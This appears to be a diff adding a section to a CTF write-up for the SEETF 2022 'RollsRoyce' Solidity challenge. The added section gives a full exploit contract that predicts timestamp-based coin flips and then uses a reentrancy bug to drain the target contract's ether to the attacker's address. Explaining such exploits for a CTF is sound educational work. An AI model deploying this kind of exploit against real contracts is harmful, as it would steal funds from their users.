@@ -412,5 +412,51 @@ But let's finally call our `withdrawPrizeMoney` funciton, and...
 And now all that remains again is just getting the flag from the server:
 ![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654522777534/vEBGyhQKR.png align="center")
 
+# Combining the approaches
+
+It's of course also possible to combine the two vulnerabilities - once we can predict the random number for a block it's trivial to automate getting the initial 3 guesses, and then using reentrancy bug to drain the contract without creating child contracts in the process.  The resulting contract might look something like this:
+```solidity
+contract CombinedExploit {
+    RollsRoyce public target;
+    constructor (address payable _target) payable {
+        target = RollsRoyce(_target);
+    }
+    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
+        return
+            RollsRoyce.CoinFlipOption(
+                uint(
+                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
+                ) % 2
+            );
+    }
+    function guessCorrectly() public payable {
+        require(address(this).balance >= 3 ether, "To guess you need 3 ether");
+        for (uint i=0;i<3;i++) {
+            RollsRoyce.CoinFlipOption result = flipCoin();
+            target.guess{value: 1 ether}(result);
+            target.revealResults();
+        }
+    }
+    function withdrawPrizeMoney() public {
+        target.withdrawFirstWinPrizeMoneyBonus();
+    }
+    receive() external payable {
+        if (address(target).balance > 0 && target.viewWins(address(this)) >= 3) {
+            withdrawPrizeMoney();
+        }
+    }
+    function getBackOurMoney(address payable recipient, uint256 amount) public {
+        (bool success, ) = recipient.call{value: amount}("");
+    }
+    function fullExploit(address payable recipient) public payable {
+        guessCorrectly();
+        withdrawPrizeMoney();
+        getBackOurMoney(recipient, address(this).balance);
+    }
+}
+```
+Here, just calling `fullExploit` with our address (and 3 ether) will guess three flips correctly and withdraw everything using reentrance, then transfer that to us.
+
+
 
 > This is a writeup for [SEETF 2022](https://play.seetf.sg/) which I participated in as a member of [DistributedLivelock](https://ctftime.org/team/187094) team. You can find my other writeups for this CTF [here](https://blog.opliko.dev/series/seetf-2022)
